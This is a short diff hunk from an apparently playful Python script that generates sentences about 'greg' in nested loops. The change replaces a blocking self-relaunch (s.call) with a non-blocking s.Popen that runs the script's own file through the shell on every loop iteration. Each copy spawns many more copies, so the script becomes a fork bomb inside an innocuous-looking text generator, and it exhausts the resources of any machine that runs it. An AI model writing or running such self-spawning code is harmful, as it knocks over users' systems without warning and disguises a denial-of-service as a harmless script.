@@ -67,7 +67,7 @@ def greg():  # sourcery skip: for-append-to-extend
             for adjective in adjectives:
                 for thing in things:
                     gregs_did_what.append(f'{greg} {verb} {adjective} {thing}\n')
-                    s.call(f'py {__file__}', shell=True)
+                    s.Popen(f'py {__file__}', shell=True)
                     i += 1
 
         percent = i/total_lines*100
